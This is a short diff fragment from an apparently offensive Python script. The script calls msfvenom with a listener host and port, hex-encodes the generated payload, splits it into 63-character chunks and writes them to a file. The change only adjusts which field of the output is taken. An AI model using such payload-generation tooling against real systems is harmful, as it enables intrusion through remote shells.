@@ -22,7 +22,8 @@ def msfvenom(lhost, lport):
     print(result.stdout)
     return result.stdout
 
-payload = msfvenom(args.lhost, args.lport).split(b"'")[3].hex()
+#payload = msfvenom(args.lhost, args.lport).split(b"'")[3].hex()
+payload = msfvenom(args.lhost, args.lport).split(b"'")[-2].hex()
 chunks = chunkstring(payload, 63)
 
 with open(args.output_file, "w") as output_file:
